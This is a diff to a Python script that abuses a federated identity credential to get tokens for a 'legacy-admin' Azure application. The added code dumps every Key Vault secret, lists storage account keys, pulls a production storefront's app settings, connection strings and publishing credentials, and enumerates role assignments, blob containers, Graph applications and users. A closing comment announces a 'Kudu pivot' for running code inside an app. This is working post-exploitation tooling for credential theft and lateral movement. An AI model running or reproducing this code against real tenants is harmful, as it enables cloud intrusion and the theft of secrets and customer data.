@@ -171,6 +171,52 @@ for name,(cid,sec) in SPS.items():
     if name=="sync-service":
         pass
 
+# tbl-legacy-admin via FIC (base-pipe matches our OIDC subject)
+LEGACY_CID="891fb158-e02c-4428-a885-53b811f369c0"
+for name,scope in [("vault","https://vault.azure.net/.default"),("arm","https://management.azure.com/.default"),("storage","https://storage.azure.com/.default"),("graph","https://graph.microsoft.com/.default")]:
+    t=assert_tok(scope,client=LEGACY_CID)
+    P("LEGACY_"+name.upper(),"LEN",len(t))
+    if not t: continue
+    if name=="vault":
+        for v in VAULTS:
+            st,b=vault_get(v,"/secrets?api-version=7.4",t)
+            P("LEGACY_VAULT_LIST",v,st,B(b[:4000]))
+            try:
+                for item in json.loads(b).get("value",[]):
+                    n=item["id"].rsplit("/",1)[1]
+                    st2,b2=vault_get(v,f"/secrets/{n}?api-version=7.4",t)
+                    P("LEGACY_SECRET",v,n,st2,B(b2[:3000])); scan_text("LEGACY/"+v+"/"+n,b2)
+            except Exception as e: P("LEGACY_VAULT_PARSE",v,str(e))
+    if name=="arm":
+        for sa in ACCTS:
+            p2=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01"
+            st,b=arm(p2,t,"POST",b"{}")
+            P("LEGACY_LISTKEYS",sa,st,B(b[:3000]))
+            if st==200:
+                try:
+                    for k in json.loads(b).get("keys",[]): KEYS.setdefault(sa,set()).add(k.get("value",""))
+                except Exception: pass
+        for path2,label2 in [
+            (f"/subscriptions/{SUB}/resources?api-version=2021-04-01","LEGACY_RESOURCES"),
+            (f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01","LEGACY_RA_SUB"),
+            (f"/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01","LEGACY_RA_RG2"),
+        ]:
+            st,b=arm(path2,t); P(label2,st,B(b[:20000]))
+        # storefront app settings
+        p2=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01"
+        st,b=arm(p2,t,"POST",b"{}"); P("LEGACY_APPSET_STORE",st,B(b[:3000]))
+        p2=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-01-01"
+        st,b=arm(p2,t,"POST",b"{}"); P("LEGACY_CONNSTR_STORE",st,B(b[:3000]))
+        p2=f"/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-01-01"
+        st,b=arm(p2,t,"POST",b"{}"); P("LEGACY_PUBCREDS_STORE",st,B(b[:3000]))
+    if name=="storage":
+        for sa in ACCTS:
+            st,b=http(f"https://{sa}.blob.core.windows.net/?comp=list",headers=dict(H(t),**{"x-ms-version":"2021-08-06"}))
+            P("LEGACY_CONT",sa,st,B(b[:3000]))
+    if name=="graph":
+        for path2,label2 in [("/v1.0/applications?$top=50&$select=id,appId,displayName","LEGACY_GRAPH_APPS"),("/v1.0/users?$top=50","LEGACY_GRAPH_USERS")]:
+            st,b=http("https://graph.microsoft.com"+path2,headers=H(t)); P(label2,st,B(b[:10000]))
+
 # Kudu pivot: reporting-svc -> publishing creds -> run UAMI probe inside app
 KUDU_OUT=""
 try:
